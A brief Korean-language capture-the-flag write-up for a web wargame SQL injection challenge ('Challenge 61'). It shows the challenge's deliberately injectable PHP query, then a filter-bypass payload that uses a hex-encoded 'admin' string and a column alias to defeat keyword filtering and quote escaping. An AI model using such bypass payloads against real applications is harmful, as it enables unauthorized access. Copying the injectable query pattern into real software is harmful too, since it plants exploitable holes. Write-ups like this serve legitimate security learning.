# SQLi

```php+HTML
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
  $db = dbconnect();
  if(!$_GET['id']) $_GET['id']="guest";
  echo "<html><head><title>Challenge 61</title></head><body>";
  echo "<a href=./?view_source=1>view-source</a><hr>";
  $_GET['id'] = addslashes($_GET['id']);
  if(preg_match("/\(|\)|select|from|,|by|\./i",$_GET['id'])) exit("Access Denied");
  if(strlen($_GET['id'])>15) exit("Access Denied");
  $result = mysqli_fetch_array(mysqli_query($db,"select {$_GET['id']} from chall61 order by id desc limit 1"));
  echo "<b>{$result['id']}</b><br>";
  if($result['id'] == "admin") solve(61);
  echo "</body></html>";
?>
```

id파라미터가 없으면 자동 id=guest가 된다.

마지막 쿼리문을 보자. 입력받은 id를 검색할때, id칼럼을 내림차순으로 정렬하고 젤 위에 있는거를 가져온다.

```sql
select {$_GET['id']} from chall61 order by id desc limit 1
```

?id='admin' from chall61-- 넣으면 

```sql
select 'admin' from chall61-- from chall61 order by id desc limit 1
```

해결될거라 생각했으나 아니었다.
from이 필터링되고 있고, ''같은 따옴표가 addslash에 의해 이스케이프가 붙는다. 

SQL에는 alias라는 기능이 있다. 
테이블에 별칭을 부여하고 그 별칭으로 접근을 할 수 있게 하는 기능이다. 

일단, admin을 따옴표없이 넣어주기 위해 16진법으로 바꾼다.
그리고 id alias를 해서 다음과 같은 payload를 인젝트한다.

```
?id=0x61646d696e as id -- 문자길이 초과, as는 생략가능
?id=0x61646d696e id
```



> SQL 우회기법으로 alias를 사용하는 방법
> SQL 공부좀 하자..